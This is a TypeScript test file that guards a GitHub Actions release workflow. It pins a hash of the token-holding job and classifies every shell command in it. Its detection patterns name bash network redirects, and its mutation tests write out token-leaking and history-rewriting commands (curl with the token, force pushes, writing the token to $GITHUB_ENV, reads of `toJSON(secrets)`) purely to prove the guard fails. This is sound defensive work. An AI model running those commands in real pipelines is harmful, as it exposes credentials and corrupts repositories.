/**
 * The guard that keeps `RELEASE_APP_PERMISSIONS` (scripts/release-app/manifest.ts) honest against
 * release.yml, the only thing that uses the release app. Modeled on CanopyCMS's
 * github-app-permission-drift.test.ts, which drives its worker against a recording proxy; here the only
 * consumer is a workflow, so this reads every workflow file PARSED (the `yaml` package), never grepped.
 *
 * TWO LAYERS
 *   1. THE PIN (`PUSH_JOB_SHA256`): the `push` job, the one that can read the App's key, is hashed whole, so
 *      any edit to it goes red until someone re-reviews it and updates the hash. Review rounds on this test
 *      kept finding forms a list of forbidden shell constructs missed; a pin does not depend on the list.
 *   2. THE RULES, which say why the pinned job needs exactly `RELEASE_APP_PERMISSIONS`, and catch the edits
 *      the pin cannot see (outside that job). In release.yml:
 *      - the triggers are pinned, and no workflow-level `env` or `defaults` reaches the job;
 *      - exactly one step mints the token, in the one job in the `release` environment (names compared without
 *        regard to case, as GitHub does); only its two inputs read `secrets` or `vars`, in any spelling;
 *      - the token asks for exactly the App's permissions (`permission-*`) and nothing that widens its reach
 *        (`owner`, `repositories`, `enterprise`, `skip-token-revoke`, another API URL);
 *      - one later `run` step, the job's last, holds the token, only through its `env`, which is fixed; it
 *        sets no `shell:`, writes no $GITHUB_ENV/$GITHUB_OUTPUT/$GITHUB_PATH, redirects only to the step
 *        summary, /dev/null or stdout/stderr, and reads $TOKEN on one line only, the one that builds the
 *        auth header;
 *      - every command in that step is classified, deny by default: a known local command needs nothing,
 *        `git push` needs contents: write, anything else is red until named here. Each `git push` goes to this
 *        repository, with hooks off, no force or deletion, landing exactly `main` and the `v$VERSION` tag;
 *      - the permissions forced, plus metadata (implied by any repository permission), equal
 *        `RELEASE_APP_PERMISSIONS`, in both directions, so an unforced permission is red too.
 *      In every other workflow: no job runs in the `release` environment, names it by expression, calls a
 *      reusable workflow from another repository, or names the key or client id.
 *
 * WHAT IT CANNOT SEE: the shell is read by a small tokenizer, not bash; the pin is what covers its gaps in the
 * job that matters. Code the pinned job runs from the commit (`scripts/release.mjs`, `.nvmrc`) is covered by
 * its own tests, not this one. The mutation tests at the bottom show each rule failing, except "needs a permission
 * RELEASE_APP_PERMISSIONS lacks", which no command the classifier knows can reach yet.
 */
import { createHash } from 'node:crypto'
import { readdirSync, readFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { parse } from 'yaml'
import {
    CLIENT_ID_VARIABLE,
    KEY_SECRET,
    RELEASE_APP_PERMISSIONS,
    RELEASE_ENVIRONMENT,
} from '../../scripts/release-app/manifest'

const WORKFLOWS = fileURLToPath(new URL('../../.github/workflows/', import.meta.url))
const RELEASE_WORKFLOW = 'release.yml'
const MINT_ACTION = 'actions/create-github-app-token@'

type Step = {
    id?: string
    name?: string
    uses?: string
    run?: string
    shell?: string
    with?: Record<string, unknown>
    env?: Record<string, unknown>
}
type Job = { environment?: unknown; steps?: Step[]; env?: Record<string, unknown>; defaults?: unknown } & Record<
    string,
    unknown
>
type Workflow = { jobs: Record<string, Job>; on?: unknown; env?: Record<string, unknown>; defaults?: unknown } & Record<
    string,
    unknown
>

/**
 * What starts release.yml. A new trigger is a new way to reach the job that holds the key, so it is pinned. The second
 * tag is a release candidate's (ADR-0014 P7); a tag never reaches `push`, whose `if` admits only `main`.
 */
const TRIGGERS = { push: { branches: ['main'], tags: ['v[0-9]+.[0-9]+.[0-9]+', 'v[0-9]+.[0-9]+.[0-9]+-rc.[0-9]+'] } }

/** Commands that need no permission and reach nothing: they run on the runner and stop there. */
const LOCAL_COMMANDS = new Set(['echo', 'printf', 'base64', 'mktemp', 'true', 'test', '['])

/** git subcommands that touch only the local repository and cannot change where a later push goes. */
const LOCAL_GIT = new Set(['init', 'rev-parse'])

/** `git -c` settings the push may carry. */
const GIT_CONFIG_KEYS = new Set(['core.hooksPath', 'http.extraheader'])

/** The only `git push` options allowed: none of them pushes more refs or rewrites one. */
const PUSH_OPTIONS = new Set(['--no-verify', '--atomic', '-q', '--quiet', '--porcelain'])

/**
 * The refs, exactly as release.yml writes them. The fetch builds the scratch repository the push goes from
 * (the verified commit, as `release`, and its tag); the push lands those two and nothing else.
 */
const FETCH_REFSPECS = ['+$sha:refs/heads/release', '+refs/tags/v$VERSION:refs/tags/v$VERSION']
const PUSH_REFSPECS = ['release:main', 'refs/tags/v$VERSION']
const PUSH_REMOTE = 'https://github.com/$GITHUB_REPOSITORY'

/** The token step's own `env`, exactly: the token, the version, and git told to read no config file. */
const STEP_ENV: Record<string, RegExp> = {
    VERSION: /^\$\{\{ needs\.plan\.outputs\.version \}\}$/,
    TOKEN: /^\$\{\{ steps\.[A-Za-z0-9_-]+\.outputs\.token \}\}$/,
    GIT_CONFIG_GLOBAL: /^\/dev\/null$/,
    GIT_CONFIG_NOSYSTEM: /^1$/,
}

/** Where a redirection in the token step may point. A file anywhere else could hand the token on. */
const REDIRECT_TARGETS = new Set(['$GITHUB_STEP_SUMMARY', '/dev/null', '&1', '&2'])

/**
 * THE PIN. A hash of the whole `push` job (its runner, its steps, each `uses` at its SHA, each `run` word for
 * word), so ANY edit to the job holding the key goes red. The rules below then explain why the pinned job
 * needs exactly `RELEASE_APP_PERMISSIONS`; they are the second layer, not the only one. Review rounds kept
 * finding new ways past a list of forbidden shell forms (`PATH=`, `printf -v`, a step before the mint
 * writing $GITHUB_ENV, `container:`, a moving action ref), which is the sign that a list is the wrong
 * instrument. When this goes red: re-read every use of the token in the job against those rules and
 * `RELEASE_APP_PERMISSIONS`, and only then update the hash (the failure message prints the new one).
 */
// Re-reviewed for ADR-0014 P7: the one change is the version check before `git apply`, which now also admits a
// release candidate's `0.x.y-rc.N`; every use of the token, and the push itself, are as they were.
const PUSH_JOB_SHA256 = '3ee60ad934665378f54c41ac19d93181fd0b0068e4b0faf7d7346c40d4ee5e6d'

/** Variables the token step may assign, as release.yml does: the commit, the scratch repository, the header. */
const ALLOWED_ASSIGNMENTS = new Set(['sha', 'pusher', 'auth'])

/** The one line of the token step allowed to read $TOKEN. */
const TOKEN_LINE = `auth=$(printf 'x-access-token:%s' "$TOKEN" | base64 -w0)`

/** A canonical JSON rendering (keys sorted at every level), so the pin does not depend on YAML key order. */
function canonicalJson(value: unknown): string {
    if (Array.isArray(value)) return `[${value.map(canonicalJson).join(',')}]`
    if (value && typeof value === 'object')
        return `{${Object.keys(value)
            .sort()
            .map((k) => `${JSON.stringify(k)}:${canonicalJson((value as Record<string, unknown>)[k])}`)
            .join(',')}}`
    return JSON.stringify(value)
}

/** Shell variables that change what git or gh reads, or where it sends things. Never set in the token step. */
const RISKY_VARIABLE =
    /^(PATH$|LD_|DYLD_|GIT_|GH_|GITHUB_|HOME$|XDG_CONFIG_HOME$|BASH_ENV$|ENV$|SSL_|CURL_|HTTPS?_PROXY$|ALL_PROXY$)/i

type Finding = string
type Operation = { command: string; permission: keyof typeof RELEASE_APP_PERMISSIONS | null }

/** Every string in a value, with a path to it, for finding where a secret or the token is mentioned. */
function strings(value: unknown, at: string, out: { at: string; text: string }[] = []) {
    if (typeof value === 'string') out.push({ at, text: value })
    else if (Array.isArray(value)) value.forEach((v, i) => strings(v, `${at}[${i}]`, out))
    else if (value && typeof value === 'object')
        for (const [k, v] of Object.entries(value)) {
            strings(k, `${at}.<key>`, out)
            strings(v, `${at}.${k}`, out)
        }
    return out
}

/** A job's environment name, lowercased: GitHub matches environment names without regard to case. */
function environmentOf(job: Job): unknown {
    const env = job.environment
    const name = env && typeof env === 'object' && 'name' in env ? (env as { name: unknown }).name : env
    return typeof name === 'string' ? name.toLowerCase() : name
}

/** Whether a `uses:` is the mint action. Owner and repository names resolve without regard to case. */
function isMint(uses: unknown): boolean {
    return typeof uses === 'string' && uses.toLowerCase().startsWith(MINT_ACTION)
}

/** Whether text names the App's key or client id, in any case (secret and variable names ignore case). */
function namesCredentials(text: string): boolean {
    const lower = text.toLowerCase()
    return lower.includes(KEY_SECRET.toLowerCase()) || lower.includes(CLIENT_ID_VARIABLE.toLowerCase())
}

/**
 * Split a script into commands, each a list of words with quotes removed. A `$(…)` becomes the word `$(…)`
 * in its command, and its own commands are returned too. Comments run to the end of the line. Backticks and
 * process substitution are refused by the caller before this runs.
 */
function commandsOf(script: string): string[][] {
    const commands: string[][] = []
    let words: string[] = []
    let word = ''
    let inWord = false
    const endWord = () => {
        if (inWord) words.push(word)
        word = ''
        inWord = false
    }
    const endCommand = () => {
        endWord()
        if (words.length > 0) commands.push(words)
        words = []
    }
    const text = script.replace(/\\\n/g, ' ')
    let i = 0
    while (i < text.length) {
        const c = text[i]
        if (c === "'") {
            const close = text.indexOf("'", i + 1)
            if (close < 0) throw new Error('unterminated single quote')
            word += text.slice(i + 1, close)
            inWord = true
            i = close + 1
        } else if (c === '"') {
            i++
            inWord = true
            while (i < text.length && text[i] !== '"') {
                if (text[i] === '\\' && i + 1 < text.length) {
                    word += text[i + 1]
                    i += 2
                } else if (text.startsWith('$(', i)) {
                    const end = matchParen(text, i + 1)
                    commands.push(...commandsOf(text.slice(i + 2, end)))
                    word += '$(…)'
                    i = end + 1
                } else word += text[i++]
            }
            if (i >= text.length) throw new Error('unterminated double quote')
            i++
        } else if (text.startsWith('$(', i)) {
            const end = matchParen(text, i + 1)
            commands.push(...commandsOf(text.slice(i + 2, end)))
            word += '$(…)'
            inWord = true
            i = end + 1
        } else if (c === '#' && !inWord) {
            while (i < text.length && text[i] !== '\n') i++
        } else if (c === '\n' || c === ';') {
            endCommand()
            i++
        } else if (c === '&' || c === '|') {
            endCommand()
            i += text[i + 1] === c ? 2 : 1
        } else if (c === ' ' || c === '\t') {
            endWord()
            i++
        } else {
            word += c
            inWord = true
            i++
        }
    }
    endCommand()
    return commands
}

function matchParen(text: string, open: number): number {
    let depth = 0
    for (let i = open; i < text.length; i++) {
        if (text[i] === '(') depth++
        else if (text[i] === ')' && --depth === 0) return i
    }
    throw new Error('unbalanced $(')
}

/**
 * A command's words without its redirections and `{`/`}`/`!`, plus the variables it assigns (a leading
 * `NAME=value`, or the whole command when it is only assignments) and where it redirects to.
 */
function significant(command: string[]): { words: string[]; assigns: string[]; redirects: string[] } {
    const words: string[] = []
    const assigns: string[] = []
    const redirects: string[] = []
    for (let i = 0; i < command.length; i++) {
        const w = command[i]
        const assignment = /^([A-Za-z_][A-Za-z0-9_]*)=/.exec(w)
        if (words.length === 0 && assignment) {
            assigns.push(assignment[1])
            continue
        }
        if (w === '{' || w === '}' || w === '!') continue
        const redirect = /^[0-9]*(>{1,2}|<{1,3}|&>{1,2})(.*)$/.exec(w)
        if (redirect) {
            const target = redirect[2] !== '' ? redirect[2] : (command[++i] ?? '')
            redirects.push(redirect[1].startsWith('<') ? `<${target}` : target)
            continue
        }
        words.push(w)
    }
    return { words, assigns, redirects }
}

/** Classify one command of a token-holding step. Pushes a finding for anything it cannot place. */
function classify(command: string[], findings: Finding[]): Operation | null {
    const { words, assigns, redirects } = significant(command)
    for (const name of assigns) {
        if (RISKY_VARIABLE.test(name))
            findings.push(`the token step sets ${name}, which changes what git or a tool reads`)
        else if (!ALLOWED_ASSIGNMENTS.has(name))
            findings.push(`the token step assigns ${name} (only ${[...ALLOWED_ASSIGNMENTS].join(', ')})`)
    }
    for (const target of redirects) {
        if (!REDIRECT_TARGETS.has(target)) findings.push(`the token step redirects to ${target}`)
    }
    const [program, ...args] = words
    if (program === undefined) return null
    if (program === 'set') {
        if (args.join(' ') !== '-euo pipefail')
            findings.push(`\`set ${args.join(' ')}\` in the token step (only -euo pipefail)`)
        return { command: 'set', permission: null }
    }
    if (program === 'printf' && args[0] === '-v')
        findings.push('`printf -v` in the token step assigns a variable unseen')
    if (
        (program === 'echo' || program === 'printf') &&
        args.some((a) => a.startsWith('::') && !a.startsWith('::add-mask::'))
    )
        findings.push(`\`${command.join(' ')}\` emits a workflow command from the token step`)
    if (LOCAL_COMMANDS.has(program)) return { command: program, permission: null }
    if (program !== 'git') {
        findings.push(
            `unclassified command \`${command.join(' ')}\` in a step holding the release app's token: name the App ` +
                'permission it needs in this test (and RELEASE_APP_PERMISSIONS), or move it out of that step',
        )
        return null
    }
    let i = 0
    const configs: string[] = []
    while (i < args.length && args[i].startsWith('-')) {
        if (args[i] === '-C') i += 2
        else if (args[i] === '-c') {
            const setting = args[i + 1] ?? ''
            const key = setting.split('=')[0]
            if (!GIT_CONFIG_KEYS.has(key)) findings.push(`git -c ${key} is not a setting the push may carry`)
            configs.push(setting)
            i += 2
        } else {
            findings.push(`unclassified git option ${args[i]}`)
            i++
        }
    }
    const sub = args[i]
    const rest = args.slice(i + 1)
    const options = rest.filter((w) => w.startsWith('-'))
    const positional = rest.filter((w) => !w.startsWith('-'))
    if (LOCAL_GIT.has(sub)) {
        for (const option of options) if (option !== '-q') findings.push(`git ${sub} ${option} is not allowed`)
        return { command: `git ${sub}`, permission: null }
    }
    if (sub === 'fetch') {
        const [remote, ...refspecs] = positional
        for (const option of options) if (option !== '-q') findings.push(`git fetch ${option} is not allowed`)
        if (remote !== '$GITHUB_WORKSPACE')
            findings.push(`git fetch from ${remote}: the token step fetches only from the workspace`)
        if (JSON.stringify(refspecs) !== JSON.stringify(FETCH_REFSPECS)) {
            findings.push(`git fetch takes ${JSON.stringify(refspecs)}; expected ${JSON.stringify(FETCH_REFSPECS)}`)
        }
        return { command: 'git fetch (local)', permission: null }
    }
    if (sub === 'push') {
        for (const option of options) {
            if (!PUSH_OPTIONS.has(option))
                findings.push(`git push ${option} is not allowed (only ${[...PUSH_OPTIONS].join(' ')})`)
        }
        if (!options.includes('--no-verify')) findings.push('git push runs without --no-verify, so a hook could run')
        if (!configs.includes('core.hooksPath=/dev/null'))
            findings.push('git push runs without -c core.hooksPath=/dev/null, so a hook could run')
        const [remote, ...refspecs] = positional
        if (remote !== PUSH_REMOTE) findings.push(`git push goes to ${remote}, not ${PUSH_REMOTE}`)
        for (const refspec of refspecs) {
            if (refspec.startsWith('+')) findings.push(`git push ${refspec} forces`)
            const [src, dst = src] = refspec.replace(/^\+/, '').split(':')
            if (src === '') findings.push(`git push ${refspec} deletes ${dst}`)
        }
        if (JSON.stringify(refspecs) !== JSON.stringify(PUSH_REFSPECS)) {
            findings.push(`git push lands ${JSON.stringify(refspecs)}; only ${JSON.stringify(PUSH_REFSPECS)} may`)
        }
        return { command: 'git push', permission: 'contents' }
    }
    findings.push(`unclassified git subcommand \`git ${sub ?? ''}\` in a step holding the release app's token`)
    return null
}

/** The `${{ … }}` expressions in a string. */
function expressions(text: string): string[] {
    return [...text.matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1].trim())
}

/**
 * In every workflow: a job's environment must be a literal (an expression could name `release` unseen), and a
 * job may call only a reusable workflow in this repository (one elsewhere could declare `environment:
 * release` and run with this repository's secrets).
 */
function jobShapeFindings(name: string, workflow: Workflow): Finding[] {
    const findings: Finding[] = []
    for (const [jobName, job] of Object.entries(workflow?.jobs ?? {})) {
        if (JSON.stringify(job.environment ?? '').includes('${{'))
            findings.push(`${name}: job ${jobName}'s environment is an expression`)
        if (typeof job.uses === 'string' && !job.uses.startsWith('./'))
            findings.push(`${name}: job ${jobName} calls a reusable workflow outside this repository (${job.uses})`)
    }
    return findings
}

/**
 * Every workflow but release.yml: none may run a job in the `release` environment (the only way to read its
 * secret), and none may name the App's key or client id at all.
 */
function auditOthers(files: { name: string; workflow: Workflow }[]): Finding[] {
    const findings: Finding[] = []
    for (const { name, workflow } of files) {
        findings.push(...jobShapeFindings(name, workflow))
        if (name === RELEASE_WORKFLOW) continue
        for (const [jobName, job] of Object.entries(workflow?.jobs ?? {})) {
            if (
                environmentOf(job) === RELEASE_ENVIRONMENT ||
                /\brelease\b/i.test(JSON.stringify(job.environment ?? ''))
            )
                findings.push(`${name}: job ${jobName} runs in the "${RELEASE_ENVIRONMENT}" environment`)
        }
        for (const s of strings(workflow, name)) {
            if (namesCredentials(s.text)) findings.push(`${s.at} names the release app's credentials`)
        }
    }
    return findings
}

/** Everything wrong with release.yml, and the permissions its use of the release app forces. */
function audit(workflow: Workflow): { findings: Finding[]; forced: Map<string, string> } {
    const findings: Finding[] = []
    const forced = new Map<string, string>()

    if (JSON.stringify(workflow.on) !== JSON.stringify(TRIGGERS)) {
        findings.push(`release.yml's triggers are ${JSON.stringify(workflow.on)}; expected ${JSON.stringify(TRIGGERS)}`)
    }

    // 1. Where the token is minted, and in which environment. Only that job can read the environment's secret.
    const mints: { job: string; index: number; step: Step }[] = []
    for (const [jobName, job] of Object.entries(workflow.jobs ?? {})) {
        ;(job.steps ?? []).forEach((step, index) => {
            if (isMint(step.uses)) mints.push({ job: jobName, index, step })
        })
        if (environmentOf(job) === RELEASE_ENVIRONMENT && !(job.steps ?? []).some((s) => isMint(s.uses)))
            findings.push(`job ${jobName} runs in the "${RELEASE_ENVIRONMENT}" environment without minting the token`)
    }
    if (mints.length !== 1) findings.push(`expected exactly one ${MINT_ACTION} step, found ${mints.length}`)
    const mint = mints[0]
    if (!mint) return { findings, forced }
    const job = workflow.jobs[mint.job]
    if (environmentOf(job) !== RELEASE_ENVIRONMENT) {
        findings.push(`job ${mint.job} mints the token outside the "${RELEASE_ENVIRONMENT}" environment`)
    }
    if (typeof mint.step.id !== 'string') {
        findings.push('the mint step has no id, so its token cannot be traced')
        return { findings, forced }
    }

    // 1b. Every mention of `secrets` or `vars` in the workflow, in any spelling (`secrets.X`, `secrets['X']`,
    // `toJSON(secrets)`), and every literal naming the key or client id. Only the mint's two inputs may.
    const mintPath = `workflow.jobs.${mint.job}.steps[${mint.index}].with`
    const allowed: Record<string, string> = {
        [`${mintPath}.private-key`]: `secrets.${KEY_SECRET}`,
        [`${mintPath}.client-id`]: `vars.${CLIENT_ID_VARIABLE}`,
    }
    for (const s of strings(workflow, 'workflow')) {
        const credentialish = expressions(s.text).filter((e) => /\b(secrets|vars)\b/i.test(e))
        const named = namesCredentials(s.text)
        if (credentialish.length === 0 && !named) continue
        const expected = allowed[s.at]
        if (expected === undefined || s.text !== `\${{ ${expected} }}`) {
            findings.push(`${s.at} reads secrets or variables, or names the release app's credentials`)
        }
    }

    // 2. What the token is asked for.
    const inputs = mint.step.with ?? {}
    const asked: Record<string, string> = {}
    for (const [key, value] of Object.entries(inputs)) {
        if (key === 'client-id' || key === 'private-key') continue
        if (key.startsWith('permission-')) asked[key.slice('permission-'.length).replace(/-/g, '_')] = String(value)
        else findings.push(`the mint step sets \`${key}\`, which widens or changes the token`)
    }
    const expectedAsk = Object.fromEntries(
        Object.entries(RELEASE_APP_PERMISSIONS).filter(([name]) => name !== 'metadata'),
    )
    if (JSON.stringify(Object.entries(asked).sort()) !== JSON.stringify(Object.entries(expectedAsk).sort())) {
        findings.push(
            `the token asks for ${JSON.stringify(asked)}; RELEASE_APP_PERMISSIONS says ${JSON.stringify(expectedAsk)}`,
        )
    }

    // 3. Where the token goes: one later run step's `env`, which must be the job's last step. A spelling this
    // cannot trace (`steps['id']`, `toJSON(steps)`) is red wherever it appears.
    for (const s of strings(workflow, 'workflow')) {
        if (
            expressions(s.text).some((e) =>
                /\bsteps\s*\[|\(\s*steps\s*\)|\bsteps\s*\)|\bsteps\s*,|\bsteps\s*$/i.test(e),
            )
        )
            findings.push(`${s.at} reads the steps context in a form this guard cannot trace`)
    }
    const tokenRef = new RegExp(`steps\\.${mint.step.id}\\.outputs`, 'i')
    const consumers = new Set<number>()
    for (const use of strings(workflow, 'workflow').filter((s) => tokenRef.test(s.text))) {
        const match = new RegExp(
            `^workflow\\.jobs\\.${mint.job}\\.steps\\[(\\d+)\\]\\.env\\.[A-Za-z_][A-Za-z0-9_]*$`,
        ).exec(use.at)
        if (!match) {
            findings.push(`${use.at} uses the release app's token; only a later run step's env may`)
            continue
        }
        const index = Number(match[1])
        if (index <= mint.index) findings.push(`${use.at} uses the token before it is minted`)
        consumers.add(index)
    }
    if (consumers.size === 0) findings.push("nothing uses the release app's token")
    if (consumers.size > 1) findings.push(`${consumers.size} steps hold the token; one may`)

    // The pin, and what reaches the job from the workflow around it.
    const digest = createHash('sha256').update(canonicalJson(job)).digest('hex')
    if (digest !== PUSH_JOB_SHA256) {
        findings.push(
            `the ${mint.job} job changed (sha256 ${digest}, pinned ${PUSH_JOB_SHA256}): re-review every use of the ` +
                "release app's token in it against RELEASE_APP_PERMISSIONS and this test's rules, then update PUSH_JOB_SHA256",
        )
    }
    if (workflow.env !== undefined) findings.push('release.yml sets a workflow-level env, which reaches the token step')
    for (const [where, holder] of [
        ['the workflow', workflow],
        [`job ${mint.job}`, job],
    ] as const) {
        if (holder.defaults !== undefined) findings.push(`${where} sets defaults, which change the token step's shell`)
        for (const key of Object.keys(holder.env ?? {})) {
            if (RISKY_VARIABLE.test(key)) findings.push(`${where} sets ${key} for the token step`)
        }
    }

    // 4. What the step holding the token does.
    for (const index of consumers) {
        const step = (job.steps ?? [])[index]
        const label = `step "${step.name ?? index}"`
        if (typeof step.run !== 'string' || step.uses !== undefined) {
            findings.push(`${label} of ${mint.job} holds the token but is not a plain run step`)
            continue
        }
        if (index !== (job.steps ?? []).length - 1)
            findings.push(`${label} holds the token but is not the job's last step`)
        if (step.shell !== undefined) findings.push(`${label} sets shell: ${step.shell}; it must run the default bash`)
        const env = step.env ?? {}
        for (const key of Object.keys(env)) {
            const rule = STEP_ENV[key]
            if (!rule || !rule.test(String(env[key]))) findings.push(`${label} sets env ${key}=${String(env[key])}`)
        }
        for (const key of Object.keys(STEP_ENV)) if (!(key in env)) findings.push(`${label} does not set env ${key}`)
        const tokenLines = step.run.split('\n').filter((line) => /\$\{?TOKEN\b/.test(line))
        if (tokenLines.length !== 1 || tokenLines[0].trim() !== TOKEN_LINE) {
            findings.push(
                `${label} reads $TOKEN outside the one line that builds the auth header: ${JSON.stringify(tokenLines)}`,
            )
        }
        if (/GITHUB_(ENV|OUTPUT|PATH)\b/.test(step.run)) {
            findings.push(`${label} holds the token and writes $GITHUB_ENV, $GITHUB_OUTPUT or $GITHUB_PATH`)
        }
        for (const [pattern, what] of [
            ['`', 'a backtick command substitution'],
            ['<(', 'a process substitution'],
            ['>(', 'a process substitution'],
            ['/dev/tcp', 'a bash network redirect'],
            ['/dev/udp', 'a bash network redirect'],
        ] as const) {
            if (step.run.includes(pattern)) findings.push(`${label} holds the token and uses ${what} (${pattern})`)
        }
        let commands: string[][]
        try {
            commands = commandsOf(step.run)
        } catch (err) {
            findings.push(`${label}: ${(err as Error).message}`)
            continue
        }
        for (const command of commands) {
            const op = classify(command, findings)
            if (op?.permission) forced.set(op.command, op.permission)
        }
    }

    // 5. Both directions.
    const needed = new Set<string>(['metadata', ...forced.values()])
    for (const name of needed) {
        if (!(name in RELEASE_APP_PERMISSIONS))
            findings.push(`release.yml needs ${name}, which RELEASE_APP_PERMISSIONS lacks`)
    }
    for (const name of Object.keys(RELEASE_APP_PERMISSIONS)) {
        if (!needed.has(name))
            findings.push(`RELEASE_APP_PERMISSIONS grants ${name}, which nothing in release.yml uses`)
    }
    return { findings, forced }
}

function loadAll(): { name: string; workflow: Workflow }[] {
    return readdirSync(WORKFLOWS)
        .filter((name) => /\.ya?ml$/.test(name))
        .map((name) => ({ name, workflow: parse(readFileSync(path.join(WORKFLOWS, name), 'utf8')) as Workflow }))
}

function load(): Workflow {
    return parse(readFileSync(path.join(WORKFLOWS, RELEASE_WORKFLOW), 'utf8')) as Workflow
}

function pushJob(workflow: Workflow): Job {
    const found = Object.values(workflow.jobs).find((job) => (job.steps ?? []).some((step) => isMint(step.uses)))
    if (!found) throw new Error('no job mints the token')
    return found
}

function pushStep(workflow: Workflow): Step {
    const step = (pushJob(workflow).steps ?? []).find((s) =>
        Object.values(s.env ?? {}).some((v) => /outputs\.token/.test(String(v))),
    )
    if (!step) throw new Error('no step uses the token')
    return step
}

describe('release.yml and the release app agree', () => {
    it('uses the App only to push main and the release tag, with exactly its permissions', () => {
        const { findings, forced } = audit(load())
        expect(findings).toEqual([])
        expect([...forced.entries()]).toEqual([['git push', 'contents']])
    })

    it('no other workflow runs in the release environment or names its credentials', () => {
        const files = loadAll()
        expect(files.map((f) => f.name)).toContain(RELEASE_WORKFLOW)
        expect(files.length).toBeGreaterThan(1)
        expect(auditOthers(files)).toEqual([])
    })

    it('goes red for another workflow in the release environment, or naming the key', () => {
        const job = { 'runs-on': 'ubuntu-latest', steps: [{ run: 'true' }] }
        expect(auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { ...job, environment: 'release' } } } }])).toEqual(
            ['x.yml: job a runs in the "release" environment'],
        )
        expect(
            auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { ...job, environment: { name: 'release' } } } } }]),
        ).toHaveLength(1)
        expect(
            auditOthers([
                {
                    name: 'x.yml',
                    workflow: { jobs: { a: { ...job, env: { K: "${{ secrets['RELEASE_BOT_PRIVATE_KEY'] }}" } } } },
                },
            ]),
        ).toHaveLength(1)
    })

    it('goes red for an environment named by expression, or a reusable workflow from elsewhere', () => {
        const job = { 'runs-on': 'ubuntu-latest', steps: [{ run: 'true' }] }
        const named = "${{ format('{0}{1}', 'rel', 'ease') }}"
        expect(auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { ...job, environment: named } } } }])).toEqual([
            "x.yml: job a's environment is an expression",
        ])
        for (const environment of ['RELEASE', 'Release', { name: 'Release' }]) {
            const leak = { ...job, environment, env: { K: '${{ toJSON(secrets) }}' } }
            expect(auditOthers([{ name: 'x.yml', workflow: { jobs: { a: leak } } }])).toEqual([
                'x.yml: job a runs in the "release" environment',
            ])
        }
        const lower = { ...job, env: { K: '${{ secrets.release_bot_private_key }}' } }
        expect(auditOthers([{ name: 'x.yml', workflow: { jobs: { a: lower } } }])).toHaveLength(1)
        const remote = 'other/repo/.github/workflows/x.yml@v1'
        expect(auditOthers([{ name: 'x.yml', workflow: { jobs: { a: { uses: remote } } } }])).toEqual([
            `x.yml: job a calls a reusable workflow outside this repository (${remote})`,
        ])
    })
})

describe('the shell reader', () => {
    it('splits commands, follows $(…), strips quotes and drops comments', () => {
        expect(
            commandsOf(`set -e # note\nx=$(git rev-parse HEAD)\necho "a $(printf '%s' "$Y" | base64 -w0) b" >> "$F"`),
        ).toEqual([
            ['set', '-e'],
            ['git', 'rev-parse', 'HEAD'],
            ['x=$(…)'],
            ['printf', '%s', '$Y'],
            ['base64', '-w0'],
            ['echo', 'a $(…) b', '>>', '$F'],
        ])
    })

    it('joins continuation lines into one command', () => {
        expect(commandsOf('git push \\\n  --atomic x')).toEqual([['git', 'push', '--atomic', 'x']])
    })
})

/**
 * Each rule seen to FAIL: the real workflow, changed in memory the way a later edit might, must go red. If
 * one of these passes, the rule it names has stopped guarding anything.
 */
describe('the guard goes red when release.yml outgrows the App', () => {
    const red = (mutate: (workflow: Workflow) => void, pattern: RegExp) => {
        const workflow = load()
        mutate(workflow)
        const { findings } = audit(workflow)
        expect(
            findings.some((finding) => pattern.test(finding)),
            JSON.stringify(findings, null, 2),
        ).toBe(true)
    }
    const appendRun = (workflow: Workflow, line: string) => {
        const step = pushStep(workflow)
        step.run = `${step.run}\n${line}\n`
    }

    it('a gh call with the token', () =>
        red(
            (w) => appendRun(w, 'GH_TOKEN="$TOKEN" gh release create "v$VERSION"'),
            /unclassified command `.*gh release/,
        ))
    it('a curl to the API', () =>
        red(
            (w) => appendRun(w, 'curl -H "Authorization: token $TOKEN" https://api.github.com/x'),
            /unclassified command `curl/,
        ))
    it('a force push', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push --force "https://github.com/$GITHUB_REPOSITORY" release:main'),
            /--force is not allowed/,
        ))
    it('a + refspec', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push "https://github.com/$GITHUB_REPOSITORY" +release:main'),
            /forces/,
        ))
    it('a deletion', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push "https://github.com/$GITHUB_REPOSITORY" :refs/tags/v0.1.0'),
            /deletes refs\/tags\/v0.1.0/,
        ))
    it('a push to another branch', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push "https://github.com/$GITHUB_REPOSITORY" release:other'),
            /lands \["release:other"\]/,
        ))
    it('a push to another repository', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push https://github.com/elsewhere/x release:main'),
            /goes to https:\/\/github.com\/elsewhere/,
        ))
    it('a push of every tag', () =>
        red(
            (w) => appendRun(w, 'git -C "$pusher" push --tags "https://github.com/$GITHUB_REPOSITORY"'),
            /--tags is not allowed/,
        ))
    it('a new git setting on the push', () =>
        red(
            (w) =>
                appendRun(
                    w,
                    'git -c credential.helper=store push "https://github.com/$GITHUB_REPOSITORY" release:main',
                ),
            /credential\.helper/,
        ))
    it('the token handed to a later step', () =>
        red((w) => appendRun(w, 'echo "T=$TOKEN" >> "$GITHUB_ENV"'), /writes \$GITHUB_ENV/))
    it('the token given to an action', () =>
        red((w) => {
            pushJob(w).steps?.push({ uses: 'some/action@v1', with: { token: '${{ steps.app-token.outputs.token }}' } })
        }, /uses the release app's token; only a later run step's env may/))
    it('the token inlined into a script', () =>
        red((w) => {
            pushJob(w).steps?.push({ run: 'echo ${{ steps.app-token.outputs.token }}' })
        }, /\.run uses the release app's token/))
    it('the key read in another job', () =>
        red((w) => {
            w.jobs.pack.steps?.push({ run: 'true', env: { K: '${{ secrets.RELEASE_BOT_PRIVATE_KEY }}' } })
        }, /jobs\.pack\..*reads secrets or variables/))
    it('the mint outside the release environment', () =>
        red((w) => {
            pushJob(w).environment = 'npm-publish'
        }, /outside the "release" environment/))
    it('a widened token request', () =>
        red((w) => {
            const mint = pushJob(w).steps?.find((s) => s.uses?.startsWith(MINT_ACTION))
            if (mint?.with) mint.with['permission-pull-requests'] = 'write'
        }, /the token asks for/))
